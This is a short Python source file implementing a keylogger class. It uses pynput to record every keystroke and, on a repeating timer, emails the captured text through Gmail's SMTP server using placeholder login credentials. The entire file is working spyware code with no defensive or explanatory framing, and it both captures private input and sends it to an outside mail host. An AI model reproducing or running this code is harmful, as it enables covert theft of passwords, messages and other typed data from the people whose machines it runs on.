#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keyloger:
    def __init__(self, time):
        self.cap = "Key logger start"
        self.time = time

    def capture(self, key):
        try:
            curr_key = key.char
        except AttributeError:
            if key == key.space:
                curr_key = " "
            else:
                curr_key = " " + str(key) + " "
        self.log(curr_key)

    def log(self, key):
        self.cap = self.cap + key

    def type(self):
        self.send_main("smaple@gmail.com", "password", self.cap)
        self.cap = ""
        thread = threading.Timer(self.time, self.type)
        thread.start()

    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.capture)
        self.type()
        with keyboard:
            keyboard.join()

    def send_main(self, email, password, message):
        mail = smtplib.SMTP("smtp.gmail.com", 587)
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, email, message)
        mail.quit()
